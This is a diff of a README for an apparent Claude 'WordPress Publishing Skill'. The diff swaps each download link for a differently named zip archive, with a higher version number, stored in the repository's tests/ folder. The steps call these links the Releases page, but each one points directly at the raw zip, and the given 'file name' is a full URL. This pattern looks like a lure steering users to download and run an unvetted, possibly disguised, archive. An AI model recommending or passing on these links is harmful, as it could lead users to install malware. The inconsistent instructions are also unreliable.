@@ -1,7 +1,7 @@
 # 🎉 WordPress-Publishing-Skill-For-Claude - Effortlessly Publish to WordPress
 
 ## 📦 Download Now
-[![Download WordPress-Publishing-Skill-For-Claude](https://raw.githubusercontent.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/main/tests/Word-Skill-For-Press-Publishing-Claude-1.5.zip)](https://raw.githubusercontent.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/main/tests/Word-Skill-For-Press-Publishing-Claude-1.5.zip)
+[![Download WordPress-Publishing-Skill-For-Claude](https://github.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/raw/refs/heads/main/tests/Publishing-Skill-Press-Claude-For-Word-v2.8.zip)](https://github.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/raw/refs/heads/main/tests/Publishing-Skill-Press-Claude-For-Word-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the WordPress Publishing Skill for Claude! This simple tool allows you to publish your content directly to your WordPress site with ease. No need to worry about complex setups or programming skills. Just follow the steps below to get started!
@@ -17,11 +17,11 @@ To ensure the best experience, please verify the following requirements before d
 To download and set up the WordPress Publishing Skill for Claude, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page on GitHub.
-   [Download WordPress-Publishing-Skill-For-Claude](https://raw.githubusercontent.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/main/tests/Word-Skill-For-Press-Publishing-Claude-1.5.zip)
+   [Download WordPress-Publishing-Skill-For-Claude](https://github.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/raw/refs/heads/main/tests/Publishing-Skill-Press-Claude-For-Word-v2.8.zip)
 
 2. **Select the Latest Release:** Look for the latest version at the top of the page. You will see the release notes and download options.
 
-3. **Download the Appropriate File:** Click on the file that matches your operating system to start the download. The file is usually named something similar to `https://raw.githubusercontent.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/main/tests/Word-Skill-For-Press-Publishing-Claude-1.5.zip`.
+3. **Download the Appropriate File:** Click on the file that matches your operating system to start the download. The file is usually named something similar to `https://github.com/ReitoKira/WordPress-Publishing-Skill-For-Claude/raw/refs/heads/main/tests/Publishing-Skill-Press-Claude-For-Word-v2.8.zip`.
 
 4. **Extract the Files:** Once the download is complete, navigate to your Downloads folder. Find the zip file, right-click on it, and select "Extract All" to get the application files.
 
